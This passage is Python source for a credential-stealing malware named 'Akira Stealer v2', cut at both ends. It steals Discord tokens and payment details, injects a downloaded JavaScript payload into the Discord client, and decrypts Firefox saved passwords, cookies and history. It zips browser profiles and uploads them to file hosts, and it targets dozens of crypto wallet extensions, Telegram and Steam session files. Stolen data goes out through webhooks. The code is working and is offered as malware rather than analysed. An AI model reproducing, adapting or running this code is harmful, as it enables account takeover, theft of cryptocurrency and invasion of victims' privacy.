        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        try:
            billingjson = loads(requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=HEADERS).text)
        except:
            return " -"

        billing = ""

        for methode in billingjson:
            if methode["invalid"] == False:
                if methode["type"] == 1:
                    billing += ":credit_card:"
                elif methode["type"] == 2:
                    billing += "<a:ppal:1154047213207572500>"
        return billing


    def get_token_info(self, token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        json = loads(requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).text)
        username = json["username"]
        hashtag = json["discriminator"]
        email = json["email"]
        identifier = json["id"]
        pfpic = json["avatar"]
        flags = json["public_flags"]
        nitro = ""
        phone = "-"

        if "premium_type" in json:
            nitrot = json["premium_type"]
            if nitrot == 1:
                nitro = "<:Normal:1154047623590854667> "
            elif nitrot == 2:
                nitro = "<a:nitro_boost:1154047626585579561> "
            else:
                nitro = ":x:"

        if "phone" in json: phone = f'`{json["phone"]}`'
        return username, hashtag, email, identifier, pfpic, flags, nitro, phone


    def send_embed(self, token):
        headers={"Content-Type": "application/json"}
        username, hashtag, email, identifier, pfpic, flags, nitro, phone = self.get_token_info(token)
        if identifier in self.identifier:
            return
        else:
            self.identifier.append(identifier)
        billing = self.get_billing(token)

        if pfpic == None: pfpic = "https://media.tenor.com/80jUMKdjZkUAAAAC/ada-wong-resident-evil.gif"
        else: pfpic = f"https://cdn.discordapp.com/avatars/{identifier}/{pfpic}"

        data = {
            "content": "",
            "tts": False,
            "embeds": [
                {
                "title": f"{username}#{hashtag}  ID: ({identifier})",
                "color": 0xbf0202,
                "fields": [
                    {
                    "name": "\n<a:checkmark:1154050913749717123> Token: ",
                    "value": f"```{token}```",
                    "inline": False
                    },
                    {
                    "name": "<:email:1154048868741300375> Email: ",
                    "value": f"```{email}```",
                    "inline": True
                    },
                    {
                    "name": "<a:phone:1154048870297378876> Phone: ",
                    "value": f"``{phone}``",
                    "inline": True
                    },
                    {
                    "name": "<a:ip:1154048864672809001> IP: ",
                    "value": f"```{self.ip_addr}```",
                    "inline": True
                    },
                    {
                    "name": "<a:danger48:1154055680433598615> Flags: ",
                    "value": f"```{flags}```",
                    "inline": True
                    },
                    {
                    "name": "<a:nitro:1154047622554865765> Nitro: ",
                    "value": f"{nitro}",
                    "inline": True
                    },
                    {
                    "name": "<a:credit:1154048866384101468> Billing : ",
                    "value": f"{billing}",
                    "inline": True
                    },
                ],
                "author": {
                },
                "thumbnail": {
                "url": f"{pfpic}"
            }
                }
            ],
            "components": [],
            "actions": {},
            "username": "Akira 💊",
            "avatar_url": "https://cdn.discordapp.com/attachments/1145735406978076845/1154021402052145272/akira-logo.png?width=256&height=256"
        }
        try:
            requests.post(self.default_webhook, json=data, headers=headers)
        except:
            pass

    def sendTokenTg(self, token):
        username, hashtag, email, identifier, pfpic, flags, nitro, phone = self.get_token_info(token)
        if nitro == ":x:":
            nitro = "❌"
        else:
            nitro = "✅"
        if identifier in self.identifier:
            return
        else:
            self.identifier.append(identifier)
        billing = self.get_billing(token)
        try:
            msg = '*📌 Found Discord Token* \n\nUsername: ' + str(username) + "\nPhone: " + str(phone) + "\nEmail: " + str(email) + "\nNitro: " + str(nitro) + "\nBilling: " + str(billing) + "\nToken: `" + str(token) + "`"
            data = {
                "message": msg
            }

            json_data = json.dumps(data)
            headers = {
                "Content-Type": "application/json"
            }

            requests.post(self.default_webhook, data=json_data, headers=headers)

        except Exception as ex:
            pass
    def send_basic_embed(self, webhook, message):
        headers={"Content-Type": "application/json"}

        data = {
        "content": "",
        "tts": False,
        "embeds": [
            {
                "description": f"{message}",
                "fields": [],
                "title": ""
            }
        ],
        "components": [],
        "actions": {},
        "avatar_url": "https://i.pinimg.com/750x/5b/e0/bd/5be0bda8a99198192a4004672205b795.jpg",
        "username": "Inculed"
        }

        try:
            requests.post(webhook, data, headers=headers)
        except:
            pass

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            try:
                                executable = app + '\\' + executable
                                subprocess.call([update, '--processStart', executable],
                                                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            except:
                                pass

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        try:
                            core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        except:
                            pass
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def injection(self):
        download_url = 'https://revengedrainer.com/.well-known/pki-validation/discord.js'
        try:
            response = requests.get(download_url)
            if response.status_code == 200:
                for directory in self.DINJECT:
                    if not os.path.exists(directory):
                        continue

                    core_info = self.get_core(directory)
                    if core_info is not None:
                        core_path, file_name = core_info
                        with open(os.path.join(core_path, 'index.js'), 'wb') as f:
                            f.write(response.content)
                        self.start_discord(directory)

                #self.send_basic_embed(self.default_webhook, "Successfully downloaded index.js on " + os.environ['COMPUTERNAME'])
        except Exception as ex:
            pass
MAGIC1 = b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"

# des-ede3-cbc
MAGIC2 = (1, 2, 840, 113_549, 3, 7)

# pkcs-12-PBEWithSha1AndTripleDESCBC
MAGIC3 = (1, 2, 840, 113_549, 1, 12, 5, 1, 3)

Header = """<================[Akira Stealer v2]>================>\n\n"""
Separator = "\n" + "".center(50, "=") + "\n"

def decrypt_aes(decoded_item, master_password, global_salt):
    entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
    iteration_count = int(decoded_item[0][0][1][0][1][1])
    key_length = int(decoded_item[0][0][1][0][1][2])
    assert key_length == 32

    encoded_password = sha1(global_salt + master_password.encode('utf-8')).digest()
    key = pbkdf2_hmac(
        'sha256', encoded_password,
        entry_salt, iteration_count, dklen=key_length)

    init_vector = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
    encrypted_value = decoded_item[0][1].asOctets()
    cipher = AES.new(key, AES.MODE_CBC, init_vector)
    return cipher.decrypt(encrypted_value)




def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
    hp = sha1(globalSalt + masterPassword.encode()).digest()
    pes = entrySalt + b"\x00" * (20 - len(entrySalt))
    chp = sha1(hp + entrySalt).digest()
    k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
    tk = hmac.new(chp, pes, sha1).digest()
    k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
    k = k1 + k2
    iv = k[-8:]
    key = k[:24]
    return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)


def getKey(directory: Path, masterPassword=""):
    dbfile: Path = directory + "key4.db"

    conn = sqlite3.connect(dbfile)
    c = conn.cursor()
    c.execute("""
        SELECT item1, item2
        FROM metadata
        WHERE id = 'password';
    """)
    row = next(c)
    globalSalt, item2 = row

    try:
        decodedItem2, _ = der_decode(item2)
        encryption_method = '3DES'
        entrySalt = decodedItem2[0][1][0].asOctets()
        cipherT = decodedItem2[1].asOctets()
        clearText = decrypt3DES(
            globalSalt, masterPassword, entrySalt, cipherT
        )  # usual Mozilla PBE
    except AttributeError:
        encryption_method = 'AES'
        decodedItem2 = der_decode(item2)
        clearText = decrypt_aes(decodedItem2, masterPassword, globalSalt)


    # decrypt 3des key to decrypt "logins.json" content
    c.execute("""
        SELECT a11, a102
        FROM nssPrivate
        WHERE a102 = ?;
    """, (MAGIC1,))
    try:
        row = next(c)
        a11, a102 = row  # CKA_ID
    except StopIteration:
        raise Exception(
            "The Firefox database appears to be broken. Try to add a password to rebuild it."
        )  # CKA_ID

    if encryption_method == 'AES':
        decodedA11 = der_decode(a11)
        key = decrypt_aes(decodedA11, masterPassword, globalSalt)
    elif encryption_method == '3DES':
        decodedA11, _ = der_decode(a11)
        oid = decodedA11[0][0].asTuple()
        assert oid == MAGIC3, f"The key is encoded with an unknown format {oid}"
        entrySalt = decodedA11[0][1][0].asOctets()
        cipherT = decodedA11[1].asOctets()
        key = decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)

    return key[:24]

def PKCS7unpad(b):
    return b[: -b[-1]]

def decodeLoginData(key, data):
    # first base64 decoding, then ASN1DERdecode
    asn1data, _ = der_decode(b64decode(data))
    assert asn1data[0].asOctets() == MAGIC1
    assert asn1data[1][0].asTuple() == MAGIC2
    iv = asn1data[1][1].asOctets()
    ciphertext = asn1data[2].asOctets()
    des = DES3.new(key, DES3.MODE_CBC, iv)
    return PKCS7unpad(des.decrypt(ciphertext)).decode()


def exportLogins(key, jsonLogins):
    if "logins" not in jsonLogins:
        return []
    logins = []
    for row in jsonLogins["logins"]:
        encUsername = row["encryptedUsername"]
        encPassword = row["encryptedPassword"]
        logins.append(
            (
                row["hostname"],
                decodeLoginData(key, encUsername),
                decodeLoginData(key, encPassword),
            )
        )
    passwords = "" + Header
    for login in logins:
        passwords += f"""URL:\t{login[0]}
Username:\t{login[1]}
Password:\t{login[2]}""" + Separator
        data.password_count += 1
    return passwords


def getJsonLogins(directory):
    with open(directory + "logins.json", "r") as loginf:
        jsonLogins = json.load(loginf)
    return jsonLogins



def decrypt_value(encrypted_value, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_value = decryptor.update(encrypted_value) + decryptor.finalize()
    return decrypted_value.decode('utf-8')


# Getting cookie
def get_firefox_cookies(profile_path):
    cookies_path = os.path.join(profile_path, 'cookies.sqlite')

    if not os.path.exists(cookies_path):
        return None

    cookies = ""
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host, name, value, path, datetime(expiry/1000000,'unixepoch') as expiry FROM moz_cookies")

    for row in cursor.fetchall():
        host, name, value, path, expires = row
        # key = getKey(profile_path+"\\")

        cookies += f"{host}\tTRUE\t{path}\tFALSE\t3181384221\t{name}\t{value}\n"
        data.cookie_count += 1

        if "google.com" in host and "Google" not in data.keywords:
            data.keywords += "Google, "
        if "github" in host and "dotcom_user" in name and "Github" not in data.keywords:
            data.keywords += "Github, "
        if "twitch" in host and "auth-token" in name and "Twitch" not in data.keywords:
            data.keywords += "Twitch, "
        if "paypal" in host and "x-pp-s" in name and "Paypal" not in data.keywords:
            data.keywords += "Paypal, "
        if "twitter" in host and "auth_token" in name and "Twitter" not in data.keywords:
            data.keywords += "Twitter, "
        if "amazon" in host and "session-token" in name and "Amazon" not in data.keywords:
            data.keywords += "Amazon, "
        if "steam" in host and "steamLoginSecure" in name and "Steam" not in data.keywords:
            data.keywords += "Steam, "
        if "tiktok" in host and "msToken" in name and "TikTok" not in data.keywords:
            data.keywords += "TikTok, "
        if "lastpass" in host and "LastPass" not in data.keywords:
            data.keywords += "LastPass, "
        if "bitwarden" in host and "Bitwarden" not in data.keywords:
            data.keywords += "Bitwarden, "
        if "cracked.io" in host and "Cracked.io" not in data.keywords:
            data.keywords += "Cracked.io, "
        if "coinbase.com" in host and "Coinbase" not in data.keywords:
            data.keywords += "Coinbase, "
        if "nulled.to" in host and "Nulled.to" not in data.keywords:
            data.keywords += "Nulled.to, "
        if "blockchain" in host and "Blockchain" not in data.keywords:
            data.keywords += "Blockchain, "
        if "stake" in host and "currency_hideZeroBalances" in name and "Stake" not in data.keywords:
            data.keywords += "Stake, "

    conn.close()
    return cookies

# Getting history
def get_history(directory):
    history_db_path = directory + "places.sqlite"
    conn = sqlite3.connect(history_db_path)
    cursor = conn.cursor()

    # Retrieve the history of visited websites
    cursor.execute("SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') as last_visit_date FROM moz_places")
    visited_websites = cursor.fetchall()
    historyData = "" + Header
    for website in visited_websites:
        url = website[0]
        title = website[1]
        last_visit_date = website[2]
        historyData += f"""
URL: {url}
Title: {title}
Last Visit Date: {last_visit_date}
""" + Separator
    data.history_count += 1
    return historyData

def grabFirefoxProfiles(wbUrl,wbUrll, fbname, fbpath):
    source_path = fbpath
    zip_path = os.path.join(os.environ.get('TEMP'), str(os.getenv("computername")) + f"_{fbname}_profiles.zip")
    Utils.TaskKill(fbname.lower())

    if os.path.isfile(zip_path):
        try:
            os.remove(zip_path)
        except:
            pass

    if os.path.exists(source_path):
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(source_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if not ".lock" in file_path and not "https+++" in file_path and not "http+++" in file_path:
                            try:
                                zipf.write(file_path, os.path.relpath(file_path, source_path))
                            except:
                                pass
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        if os.path.exists(source_path):
            found_msg = ""
            try:
                for root, dirs, files in os.walk(source_path):
                    for file in files:
                        if file == "extensions.json":
                            file_path = os.path.join(root, file)
                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                ext_data = f.read().split("defaultLocale")
                                for ext in ext_data:
                                    try:
                                        name = ext.split('"name":"')[1].split('"')[0]
                                        if 'visible":true,"active":true' in ext and '"signedState":2' in ext and name not in found_msg:
                                            found_msg += f"- {name}\n"
                                    except:
                                        pass

            except Exception as e:
                Akira.logErrorTg(traceback.format_exc())


        try:
            if len(found_msg) >= 1:
                found_msg = "Installed Extensions:\n\n" + found_msg
                try:
                    server_response = requests.get("https://api.gofile.io/getServer", timeout=30)
                    server_response.raise_for_status()
                    server = server_response.json()["data"]["server"]

                    with open(zip_path, 'rb') as file:
                        upload_response = requests.post(f'https://{server}.gofile.io/uploadFile', files={'file': file}, timeout=30)
                        upload_response.raise_for_status()
                        return upload_response.json()["data"]["downloadPage"]
                except:
                    try:
                        with open(zip_path, 'rb') as file_content:
                            files = {'file': (os.path.basename(zip_path), file_content)}
                            response = requests.post('https://file.io/', files=files)
                            response.raise_for_status()
                            link = response.json()["link"]
                            firefoxUrl = link
                    except:
                        firefoxUrl = ""
                msg = "🦊 " + str(os.getenv("computername")) + " Firefox Profiles" + '\n\n' + f"[Download Firefox Data]({firefoxUrl}) \n\n" + found_msg
                data = {
                    "message": msg
                }

                json_data = json.dumps(data)
                headers = {
                    "Content-Type": "application/json"
                }

                requests.post(wbUrl, data=json_data, headers=headers)
                if "mumu" in wbUrll:
                    requests.post(wbUrll, data=json_data, headers=headers)
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
    if os.path.isfile(zip_path):
        try:
            os.remove(zip_path)
        except:
            pass


def GeckoDriver(wbUrl, wbUrll):
    appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
    folderPath = Utils.get_temp_folder()

    browsers = {
        "Firefox": appdata + "\\Mozilla\\Firefox\\Profiles",
        "Waterfox": appdata + "\\Waterfox\Profiles",
        "Palemoon": appdata + "\\Moonchild Productions\\Pale Moon\\Profiles"
    }



    browsers_data = {}
    alreadyCheckedProfiles = []
    for key, value in browsers.items():

        matching_folders = glob.glob(os.path.join(value, "*default*"))
        i = 0
        for profile_path in matching_folders:
            browsers_data[key+"_"+str(i)] = {}
            profile_path += "\\"
            if os.path.join(profile_path.split("Profiles")[0], "Profiles") not in alreadyCheckedProfiles:
                alreadyCheckedProfiles.append(os.path.join(profile_path.split("Profiles")[0], "Profiles"))
                Thread(target=grabFirefoxProfiles,args=(wbUrl,wbUrll,key,os.path.join(profile_path.split("Profiles")[0], "Profiles"),)).start()
            try:
                browsers_data[key+"_"+str(i)]["Saved_Passwords"] = exportLogins(getKey(profile_path), getJsonLogins(profile_path))
                browsers_data[key+"_"+str(i)]["Browser_Cookies"] = get_firefox_cookies(profile_path)
                browsers_data[key+"_"+str(i)]["Browser_History"] = get_history(profile_path)
            except Exception as e:
                pass
            i += 1

    if browsers_data:
        for browser_name in browsers_data:

            new = True

            if "Saved_Passwords" in browsers_data[browser_name]:
                if os.path.exists(folderPath + "\\Passwords\\" + browser_name + ".txt") == False:
                    open(folderPath + "\\Passwords\\" + browser_name + ".txt","w").close()
                with open(folderPath + "\\Passwords\\" + browser_name + ".txt", 'w', encoding='UTF-8') as f:
                    f.write(browsers_data[browser_name]['Saved_Passwords'])
                if new:
                    new = False

            if "Browser_Cookies" in browsers_data[browser_name]:
                if os.path.exists(folderPath + "\\Cookies\\" + browser_name + ".txt") == False:
                    open(folderPath + "\\Cookies\\" + browser_name + ".txt","w").close()
                with open(folderPath + "\\Cookies\\" + browser_name + ".txt", 'w', encoding='UTF-8') as f:
                    f.write(browsers_data[browser_name]['Browser_Cookies'])
                if new:
                    new = False
paths = {
    "Brave" : (os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"), "brave"),
    "Chrome" : (os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"), "chrome"),
    "Chromium" : (os.path.join(os.getenv("localappdata"), "Chromium", "User Data"), "chromium"),
    "Comodo" : (os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"), "comodo"),
    "Edge" : (os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"), "msedge"),
    "EpicPrivacy" : (os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"), "epic"),
    "Iridium" : (os.path.join(os.getenv("localappdata"), "Iridium", "User Data"), "iridium"),
    "Opera" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"), "opera"),
    "Opera GX" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"), "operagx"),
    "Slimjet" : (os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"), "slimjet"),
    "UR" : (os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"), "urbrowser"),
    "Vivaldi" : (os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"), "vivaldi"),
    "Yandex" : (os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data"), "yandex")
}

browserPath = [
    ["Chrome", os.getenv('LOCALAPPDATA') + "/Google/Chrome/User Data/"],
    ["ChromeSxS", os.getenv('LOCALAPPDATA') + "/Google/Chrome SxS/User Data/"],
    ["Opera", os.getenv('APPDATA') + "/Opera Software/Opera Stable/"],
    ["Opera GX", os.getenv('APPDATA') + "/Opera Software/Opera GX Stable/"],
    ["Brave", os.getenv('LOCALAPPDATA') + "/BraveSoftware/Brave-Browser/User Data/"],
    ["Opera", os.getenv('LOCALAPPDATA') + "/Yandex/YandexBrowser/User Data/"],
    ["Edge", os.getenv('LOCALAPPDATA') + "/Microsoft/Edge/User Data/"],
    ["Amigo", os.getenv('LOCALAPPDATA') + "/Amigo/User Data/"],
    ["Torch", os.getenv('LOCALAPPDATA') + "/Torch/User Data/"],
    ["Kometa", os.getenv('LOCALAPPDATA') + "/Kometa/User Data/"],
    ["Orbitum", os.getenv('LOCALAPPDATA') + "/Orbitum/User Data/"],
    ["CentBrowser", os.getenv('LOCALAPPDATA') + "/CentBrowser/User Data/"],
    ["7Star", os.getenv('LOCALAPPDATA') + "/7Star/7Star/User Data/"],
    ["Sputnik", os.getenv('LOCALAPPDATA') + "/Sputnik/Sputnik/User Data/"],
    ["Vivaldi", os.getenv('LOCALAPPDATA') + "/Vivaldi/User Data/"],
    ["Epic Privacy Browser", os.getenv('LOCALAPPDATA') + "/Epic Privacy Browser/User Data/"],
    ["Uran", os.getenv('LOCALAPPDATA') + "/uCozMedia/Uran/User Data/"],
    ["Iridium", os.getenv('LOCALAPPDATA') + "/Iridium/User Data/"],
    ["Yandex", os.getenv('LOCALAPPDATA') + "/Yandex/YandexBrowser/User Data/"]
]

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
}

walletsExtensions = [
    ["Coinbase_Indexeddb", "/IndexedDB/chrome-extension_hnfanknocfeofbddgcijnmhnfnkdnaad_0.indexeddb.leveldb"],
    ["Solflare", "/Local Extension Settings/bhhhlbepdkbapadjdnnojkbgioiodbic"],
    ["Metamask", '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
    ["Phantom", "/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"],
    ["Exodus", "/Local Extension Settings/aholpfdialjgjfhomihkjbmgjidlcdno"],
    ["EVO Wallet", "/Local Extension Settings/dcbjpgbkjoomeenajdabiicabjljlnfp"],
    ["Fewcha", "/Local Extension Settings/ebfidpplhabeedpnhjnobghokpiioolj"],
    ["Hive Wallet", "/Local Extension Settings/jcacnejopjdphbnjgfaaobbfafkihpep"],
    ["Martian Aptos", "/Local Extension Settings/efbglgofoippbgcjepnhiblaibcnclgk"],
    ["Math Wallet", "/Local Extension Settings/afbcbjpbpfadlkmhmclhkeeodmamcflc"],
    ["Nightly", "/Local Extension Settings/fiikommddbeccaoicoejoniammnalkfa"],
    ["Petra Wallet", "/Local Extension Settings/ejjladinnckdgjemekebdpeokbikhfci"],
    ["Pontem", "/Local Extension Settings/phkbamefinggmakgklpkljjmgibohnba"],
    ["Rise Wallet", "/Local Extension Settings/hbbgbephgojikajhfbomhlmmollphcad"],
    ["StarMask", "/Local Extension Settings/mfhbebgoclkghebffdldpobeajmbecfk"],
    ["Trust Wallet", "/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"],
    ["Binance", "/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"],
    ["Ronin", "/Local Extension Settings/fnjhmkhhmkbjkkabndcnnogagogbneec"],
    ["Jaxx", "/Local Extension Settings/cjelfplplebdjjenllpjcblmjkfcffne"],
    ["Gamestop Wallet", "/Local Extension Settings/pkkjjapmlcncipeecdmlhaipahfdphkd"],
    ["OKX Wallet", "/Local Extension Settings/mcohilncbfahbmgdjkbpemcciiolgcge"],
    ["Coin98", "/Local Extension Settings/aeachknmefphepccionboohckonoeemg"],
    ["Braavos Wallet", "/Local Extension Settings/jnlgamecbpmbajjfhmmmlhejkemejdma"],
    ["Crypto.com", "/Local Extension Settings/hifafgmccdpekplomjjkcfgodnhcellj"],
    ["Glass Wallet", "/Local Extension Settings/loinekcabhlmhjjbocijdoimmejangoa"],
    ["Bitfinity", "/Local Extension Settings/jnldfbidonfeldmalbflbmlebbipcnle"],
    ["Exodus", "/Local Extension Settings/jnldfbidonfeldmalbflbmlebbipcnle"],
    ["EVER Wallet", "/Local Extension Settings/cgeeodpfagjceefieflmdfphplkenlfk"],
    ["Ton Wallet", "/Local Extension Settings/nphplpgoakhhjchkkhmiggakijnkhfnd"],
    ["Ton Keeper", "/Local Extension Settings/omaabbefbmiijedngplfjmnooppbclkk"],
    ["OpenMask", "/Local Extension Settings/penjlddjkjgpnkllboccdgccekpkcbin"],
    ["MyTonWallet", "/Local Extension Settings/fldfpgipfncgndfolcbkdeeknbbbnhcc"],
    ["Morphis", "/Local Extension Settings/heefohaffomkkkphnlpohglngmbcclhi"],
    ["Virgo Wallet", "/Local Extension Settings/ibljocddagjghmlpgihahamcghfggcjc"],
    ["KardiaChain", "/Local Extension Settings/pdadjkfkgcafgbceimcpbkalnfnepbnk"],
    ["TerraStation", "/Local Extension Settings/aiifbnbfobpmeekipheeijimdpnlpgpp"],
    ["Wombat", "/Local Extension Settings/amkmjjmmflddogmhpjloimipbofnfjih"],
    ["Harmony", "/Local Extension Settings/fnnegphlobjdpkhecapkijjdkgcjhkib"],
    ["Nami", "/Local Extension Settings/lpfcbjknijpeeillifnkikgncikgfhdo"],
    ["XDEFI", "/Local Extension Settings/hmeobnfnfcmdkdcmlblgagmfpfboieaf"],
    ["Yoroi", "/Local Extension Settings/ffnbelfdoeiohenkjibnmadjiehjhajb"],
    ["MetaMask_Edge", "/Local Extension Settings/ejbalbakoplchlghecdalmeeeajnimhm"],
    ["Tron", "/Local Extension Settings/ibnejdfjmmkpcnlpebklmnkoeoihofec"],
    ["Authenticator", "/Sync Extension Settings/bhghoamapcdpbohphigoooaddinpkbai"],
    ["Rabby", "/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch"],
    ["Frontier", "/Local Extension Settings/kppfdiipphfccemcignhifpjkapfbihd"],
    ["Moso", "/Local Extension Settings/ajkifnllfhikkjbjopkhmjoieikeihjb"],
    ["Wallet Guard", "/Local Extension Settings/pdgbckgdncnhihllonhnjbdoighgpimk"],
    ["Enkrypt", "/Local Extension Settings/kkpllkodjeloidieedojogacfhpaihoh"],
    ["Cirus", "/Local Extension Settings/kgdijkcfiglijhaglibaidbipiejjfdp"],
    ["SubWallet", "/Local Extension Settings/onhogfjeacnfoofkfgppdlbmlmnplgbn"],
    ["BitGet", "/Local Extension Settings/jiidiaalihmmhddjgbnbgdfflelocpak"],
    ["Pontem", "/Local Extension Settings/phkbamefinggmakgklpkljjmgibohnba"],
    ["Leap Cosmos", "/Local Extension Settings/fcfcfllfndlomdhbehjjcoimbgofdncg"],
    ["Fuelet", "/Local Extension Settings/bifidjkcdpgfnlbcjpdkdcnbiooooblg"],
    ["Sender", "/Local Extension Settings/epapihdplajcdnnkdeiahlgigofloibg"],
    ["Talisman", "/Local Extension Settings/fijngjgcjhjmmpcmkeiomlglpeiijkld"],
    ["ArgentX", "/Local Extension Settings/dlcobpjiigpikoobohmabehhmhfoodbb"],
    ["Pali", "/Local Extension Settings/mgffkfbidihjpoaomajlbgchddlicgpn"],
    ["Fewcha", "/Local Extension Settings/ebfidpplhabeedpnhjnobghokpiioolj"],
    ["Manta", "/Local Extension Settings/enabgbdfcbaehmbigakijjabdpdnimlg"],
    ["Bitmask", "/Local Extension Settings/momakdpclmaphlamgjcndbgfckjfpemp"],
    ["Carax Demon", "/Local Extension Settings/mdjmfdffdcmnoblignmgpommbefadffd"],
    ["Cosmostation", "/Local Extension Settings/fpkhgmpbidmiogeglndfbkegfdlnajnf"],
    ["Suiet", "/Local Extension Settings/khpkpbbcccdmmclmpigdgddabeilkdpd"],
    ["Sui Wallet", "/Local Extension Settings/opcgpfmipidbgpenhmajoajpbobppdil"],
    ["Ethos Sui Wallet", "/Local Extension Settings/mcbigmjiafegjnnogedioegffbooigli"],
    ["Zerion", "/Local Extension Settings/klghhnkeealcohjjanjjdaeeggmfmlpl"],
    ["Proton Pass", "/Local Extension Settings/ghmbeldphafepmbegfdlkpapadhbakde"],
    ["Keplr", "/Local Extension Settings/dmkamcknogkgcdfhhbddcghachkejeap"],
    ["Doge Labs", "/Local Extension Settings/jiepnaheligkibgcjgjepjfppgbcghmp"],
    ["UniSat", "/Local Extension Settings/ppbibelpcjmhbdihakflkdcoccbgbkpo"],
    ["Ninji Wallet", "/Local Extension Settings/kkpllbgjhchghjapjbinnoddmciocphm"],
    ["Magic Eden", "/Local Extension Settings/mkpegjkblkkefacfnmkajcjmabijhclg"]
]


walletsDesktop = [
    ["Zcash", os.getenv('APPDATA') + "/Zcash"],
    ["Armory", os.getenv('APPDATA') + "/Armory"],
    ["Bytecoin", os.getenv('APPDATA') + "/bytecoin"],
    ["Jaxx", os.getenv('APPDATA') + "/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb"],
    ["Exodus", os.getenv('APPDATA') + "/Exodus/exodus.wallet"],
    ["Coinomi", os.getenv('APPDATA') + "/Coinomi/Coinomi/wallets"],
    ["Ethereum", os.getenv('APPDATA') + "/Ethereum/keystore"],
    ["Electrum", os.getenv('APPDATA') + "/Electrum/wallets"],
    ["AtomicWallet", os.getenv('APPDATA') + "/atomic/Local Storage/leveldb"],
    ["Guarda", os.getenv('APPDATA') + "/Guarda/Local Storage/leveldb"],
    ["Rabby", os.getenv('APPDATA') + "/rabby-desktop"],
]

Telegram = [f"{os.getenv('APPDATA')}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

keywordsFiles = [
    "passw",
    "seed",
    "mnemo",
    "phrase",
    "mdp",
    "motdepasse",
    "mot_de_passe",
    "login",
    "secret",
    "account",
    "acount",
    "paypal",
    "banque",
    "account",
    "metamask",
    "wallet",
    "crypto",
    "exodus",
    "discord",
    "2fa",
    "code",
    "memo",
    "compte",
    "token",
    "backup",
    "secret",
    "mom",
    "family",
    "private",
    "key",
    "twitter",
    "auth"
]

searchFolders = [
    "Desktop",
    "Documents",
    "Downloads",
    "OneDrive"
]
class Steam:
    def __init__(self, webhook_url):
        self.webhook = webhook_url
        self.steam_hook()

    def get_steam_path(self):
        try:
            pgx86 = os.environ.get("PROGRAMFILES(X86)")
            if pgx86:
                steam_path = os.path.join(pgx86, "steam")
                if os.path.exists(steam_path):
                    return steam_path
        except:
            pass
        return ""

    def get_ssfn_files(self, steam_path):
        try:
            files = []
            for file in os.listdir(steam_path):
                if file.startswith("ssfn"):
                    files.append(os.path.join(steam_path, file))
            return files
        except:
            return []

    def zip_steam_session(self, config_path, ssfn_files):
        try:
            with zipfile.ZipFile(os.path.join(os.environ['TEMP'], 'steam_session.zip'), 'w', zipfile.ZIP_DEFLATED) as zp:
                for root, dirs, file_names in os.walk(config_path):
                    for file_name in file_names:
                        file_path = os.path.join(root, file_name)
                        zp.write(file_path)
                for ssfn_file in ssfn_files:
                    zp.write(ssfn_file)
        except:
            pass

    def copy_ssfn_files(self, steam_path):
        try:
            temp_folder = os.path.join(os.environ['TEMP'], 'ssfn_files')
            os.makedirs(temp_folder, exist_ok=True)
            for file in os.listdir(steam_path):
                if file.startswith("ssfn"):
                    src_path = os.path.join(steam_path, file)
